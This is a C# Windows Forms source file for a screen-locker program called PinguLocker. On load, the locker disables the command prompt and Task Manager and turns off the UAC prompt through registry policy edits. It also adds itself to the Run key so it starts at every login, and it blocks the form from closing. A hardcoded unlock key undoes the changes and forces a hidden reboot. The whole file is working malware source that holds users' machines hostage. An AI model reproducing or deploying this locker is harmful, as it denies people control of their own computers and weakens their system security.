using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;

namespace PinguLocker
{
    public partial class WindowsLocked : Form
    {
        public WindowsLocked()
        {
            InitializeComponent();
        }

        private void WindowsLocked_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("Sorry this is incorrect key.", "INCORRECT KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (textBox1.Text == "PINGUPINGUPINGU123864")
            {
                MessageBox.Show("It is correct key. Your lucky!", "CORRECT KEY", MessageBoxButtons.OK, MessageBoxIcon.Information);
                RegistryKey Cmd = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
                Cmd.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
                RegistryKey taskMgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                taskMgr.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                rk.SetValue("PinguLock", 0, RegistryValueKind.String); // This not start up back.
                RegistryKey rk2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                rk2.SetValue("EnableLUA", 1, RegistryValueKind.DWord); // This enable UAC prompt
                ProcessStartInfo rebooter = new ProcessStartInfo();
                rebooter.FileName = "cmd.exe";
                rebooter.WindowStyle = ProcessWindowStyle.Hidden;
                rebooter.Arguments = @"/k wmic os where primary=1 reboot";
                Process.Start(rebooter);
            }
        }

        private void WindowsLocked_Load(object sender, EventArgs e)
        {
            RegistryKey Cmd = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            Cmd.SetValue("DisableCMD", 4, RegistryValueKind.DWord);
            RegistryKey taskMgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            taskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("PinguLock", Application.ExecutablePath.ToString()); // This means to start to every login.
            RegistryKey rk2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk2.SetValue("EnableLUA", 0, RegistryValueKind.DWord); // This disable UAC prompt
        }
    }
}
